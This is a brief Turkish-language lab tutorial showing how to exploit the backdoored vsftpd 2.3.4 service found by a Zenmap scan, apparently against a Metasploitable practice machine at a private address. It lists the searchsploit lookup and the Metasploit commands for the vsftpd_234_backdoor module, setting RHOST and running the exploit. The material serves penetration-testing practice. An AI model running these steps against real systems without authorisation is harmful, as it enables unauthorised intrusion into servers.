21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

Zenmap'ten aldığımız açığı nasıl sömürebiliriz.

msfconsole _> terminale yazıyoruz. bize hacking tool'u açacak(metasploit)

açığın versiyonunu alıyoruz -> vsftpd 2.3.4

searchsploit aracı ile buna uygun exploit bulabiliriz:
searchsploit vsftpd 2.3.4


msfconsole'a geri dönüyoruz.
use exploit/unix/ftp/vsftpd_234_backdoor -> bu exploiti kullan dedik ve exploit içine girdik
show options -> bize ilgili exploit'in ayarlarını gösterir.
RHOST ve RPORT görüyoruz port 21 fakat host kısmı boş bunu değiştirmemiz lazım;
set RHOST 10.0.2.7 -> RHOST'u ayarladık hedef metasploit makinamızın ipsine göre
exploit -> bağlantıyı sağlıyoruz.
